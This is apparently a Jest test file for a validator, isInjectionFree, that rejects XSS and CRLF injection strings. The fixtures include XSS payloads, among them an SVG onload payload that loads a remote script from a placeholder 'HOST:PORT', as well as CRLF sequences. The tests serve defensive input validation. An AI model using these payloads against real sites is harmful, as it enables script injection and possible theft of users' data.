import { isInjectionFree } from "../../src/utils/isInjectionFree";

describe("isInjectionFree", () => {
  it("should return false for XSS injection attempts", () => {
    expect(isInjectionFree('<script>alert("XSS")</script>')).toBe(false);
    expect(isInjectionFree("<img src=\"javascript:alert('XSS')\">")).toBe(
      false,
    );
    expect(
      isInjectionFree("<div onmouseover=\"alert('XSS')\">Hover me</div>"),
    ).toBe(false);
    expect(
      isInjectionFree(
        '<svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>',
      ),
    ).toBe(false);
    expect(isInjectionFree("<body onload=alert('XSS')>")).toBe(false);
  });

  it("should return false for CRLF injection attempts", () => {
    expect(isInjectionFree("q\rlf\n")).toBe(false);
    expect(isInjectionFree("Hello%0D%0AWorld")).toBe(false);
  });

  it("should return true for safe inputs", () => {
    expect(isInjectionFree("Hello, world!")).toBe(true);
    expect(isInjectionFree("This is a safe string.")).toBe(true);
    expect(isInjectionFree("12345")).toBe(true);
  });
});
